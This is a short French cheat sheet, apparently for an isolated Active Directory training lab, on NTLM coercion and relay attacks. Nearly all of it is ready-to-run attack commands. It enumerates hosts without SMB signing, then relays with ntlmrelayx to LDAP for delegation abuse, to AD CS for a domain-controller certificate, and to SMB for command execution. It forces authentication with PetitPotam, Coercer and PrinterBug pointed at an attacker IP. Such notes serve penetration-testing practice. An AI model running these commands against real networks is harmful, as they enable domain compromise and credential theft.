# Coercition + relais — aide-mémoire (lab isolé GOAD-X uniquement)

## Cibles relayables
nxc smb <cidr> --gen-relay-list relay_targets.txt       # SMB signing = false
nxc ldap <dc>                                            # vérifier signing/channel binding

## Relais (choisir la cible)
# -> LDAP (RBCD)
sudo ntlmrelayx.py -t ldap://<dc> --delegate-access --no-dump -smb2support
# -> AD CS (ESC8)
sudo ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
# -> SMB (exec)
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -c "whoami"

## Coercition (déclencheurs)
python3 PetitPotam.py <attacker_ip> <victim>            # MS-EFSRPC
coercer coerce -u user -p pass -t <victim> -l <attacker_ip>   # multi-méthodes
# PrinterBug : printerbug.py 'dom/user:pass'@<victim> <attacker_ip>

## Exploitation
# LDAP+delegate -> getST (module 53) ; ADCS -> certipy auth (module 43/56)
